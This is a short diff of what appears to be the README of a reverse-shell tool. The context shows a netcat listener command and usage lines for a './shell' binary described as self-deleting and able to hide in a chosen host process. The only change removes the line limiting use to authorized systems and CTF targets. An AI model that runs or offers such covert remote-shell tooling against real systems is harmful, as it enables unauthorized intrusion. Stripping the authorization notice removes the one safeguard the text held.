@@ -27,5 +27,3 @@ nc -lvnp <PORT>
 ./shell                                    # auto-hosts, self-deletes, one file
 ./shell --name <proc>                      # force a specific host process
 ```
-
-Use only on systems and CTF targets where you have authorization.
